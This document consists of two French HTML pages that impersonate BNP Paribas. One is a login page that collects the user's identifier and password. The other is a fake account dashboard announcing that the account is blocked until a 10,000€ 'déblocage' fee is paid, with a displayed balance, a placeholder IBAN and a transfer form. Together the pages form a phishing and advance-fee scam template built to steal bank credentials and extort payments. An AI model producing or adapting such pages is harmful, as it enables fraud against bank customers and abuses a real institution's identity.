<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - BNP Paribas</title>
</head>
<body>
    <div class="login-container">
        <h2>Accédez à votre compte BNP Paribas</h2>
        <form action="/dashboard" method="POST">
            <div class="input-group">
                <label>Identifiant</label>
                <input type="text" name="email" placeholder="Votre identifiant" required>
            </div>
            <div class="input-group">
                <label>Mot de passe</label>
                <input type="password" name="password" placeholder="Votre mot de passe" required>
            </div>
            <button type="submit">Se connecter</button>
        </form>
    </div>
</body>
</html>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tableau de bord - BNP Paribas</title>
</head>
<body>
    <div class="dashboard-container">
        <h1>Bienvenue, Thomas Rousseau</h1>
        <p>Votre compte est actuellement bloqué pour des raisons de sécurité.</p>
        <p>Pour débloquer votre compte, vous devez payer des frais de déblocage de 10.000€.</p>
        <h2>Solde : 50.000€</h2>

        <div class="transaction">
            <h3>Transactions récentes :</h3>
            <ul>
                <li>Achat Netflix - 15€</li>
                <li>Paiement au supermarché - 100€</li>
            </ul>
        </div>

        <div class="payment-card">
            <h3>Carte de paiement :</h3>
            <p>Nom : Thomas Rousseau</p>
            <p>IBAN : FR76 1234 5678 9012 3456 7890 123</p>
        </div>

        <div class="transfer">
            <h3>Effectuer un virement :</h3>
            <form action="/virement" method="POST">
                <label for="receiver">Compte destinataire :</label>
                <input type="text" name="receiver" placeholder="IBAN destinataire" required>
                <label for="amount">Montant à transférer :</label>
                <input type="number" name="amount" placeholder="Montant" required>
                <button type="submit">Effectuer le virement</button>
            </form>
        </div>
    </div>
</body>
</html>
